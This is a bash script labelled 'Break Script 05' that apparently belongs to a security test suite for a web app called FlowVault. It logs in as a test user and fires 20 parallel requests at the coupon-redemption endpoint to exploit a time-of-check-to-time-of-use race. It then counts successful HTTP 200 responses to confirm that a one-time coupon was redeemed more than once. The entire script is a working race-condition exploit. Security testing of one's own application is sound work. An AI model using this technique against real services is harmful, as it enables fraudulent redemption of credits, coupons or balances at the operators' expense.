#!/usr/bin/env bash
set -e

# ==============================================================================
# Break Script 05: Race Condition on Coupon Redemption (TOCTOU)
# ==============================================================================
# Target: POST /api/coupons/redeem
# Attack Flow:
# 1. Log in as User A (usera@example.com)
# 2. Check initial credits balance
# 3. Fire 20 parallel HTTP requests to redeem one-time coupon PRO50 simultaneously
# 4. Confirm multiple redemptions succeeded, yielding >500 credits
# ==============================================================================

BASE_URL="${BASE_URL:-http://localhost:3000}"
COOKIE_JAR="/tmp/flowvault_race_cookie.txt"
TMP_DIR="/tmp/flowvault_race_results"

rm -rf "${TMP_DIR}"
mkdir -p "${TMP_DIR}"

echo "[*] Authenticating as User A..."
curl -s -c "${COOKIE_JAR}" -X POST "${BASE_URL}/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email": "usera@example.com", "password": "Password123!"}' >/dev/null

echo "[*] Fetching initial credits..."
INITIAL_PROFILE=$(curl -s -b "${COOKIE_JAR}" "${BASE_URL}/api/auth/me")
echo "[+] Initial State: ${INITIAL_PROFILE}"

echo ""
echo "[*] Launching 20 parallel redemption requests for coupon 'PRO50'..."

for i in $(seq 1 20); do
  (
    RES=$(curl -s -w "\n%{http_code}" -b "${COOKIE_JAR}" -X POST "${BASE_URL}/api/coupons/redeem" \
      -H "Content-Type: application/json" \
      -d '{"code": "PRO50"}')
    echo "${RES}" > "${TMP_DIR}/res_${i}.txt"
  ) &
done

wait

echo "[*] All 20 requests completed. Analyzing results..."

SUCCESS_COUNT=0
FAIL_COUNT=0

for f in "${TMP_DIR}"/res_*.txt; do
  CODE=$(tail -n 1 "$f")
  if [ "$CODE" = "200" ]; then
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
  else
    FAIL_COUNT=$((FAIL_COUNT + 1))
  fi
done

FINAL_PROFILE=$(curl -s -b "${COOKIE_JAR}" "${BASE_URL}/api/auth/me")

echo ""
echo "=============================================================================="
echo " RACE CONDITION EXPLOIT RESULTS"
echo "=============================================================================="
echo " Total Requests Dispatched: 20"
echo " Successful Redemptions (HTTP 200): ${SUCCESS_COUNT}"
echo " Blocked Redemptions    (HTTP 400): ${FAIL_COUNT}"
echo " Final Profile State: ${FINAL_PROFILE}"
echo "=============================================================================="

if [ "${SUCCESS_COUNT}" -gt 1 ]; then
  echo "[!] VULNERABILITY CONFIRMED: One-time coupon redeemed ${SUCCESS_COUNT} times via TOCTOU race window!"
else
  echo "[*] Single redemption recorded. Note: Parallel execution depends on event loop timing."
fi

rm -rf "${TMP_DIR}" "${COOKIE_JAR}"
